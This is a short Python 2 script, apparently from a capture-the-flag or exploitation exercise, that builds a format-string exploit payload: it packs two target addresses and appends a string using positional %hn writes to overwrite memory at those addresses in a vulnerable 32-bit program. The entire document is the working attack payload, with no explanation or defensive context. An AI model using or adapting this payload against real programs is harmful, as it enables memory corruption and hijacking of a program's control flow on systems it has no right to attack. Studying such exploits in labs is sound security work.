import struct

bigM = struct.pack("<I", 0x8049812)
lilM = struct.pack("<I", 0x8049810)
fstring = "%250x" + "%12$hn" + "%21570x" + "%13$hn"

print bigM + lilM + fstring
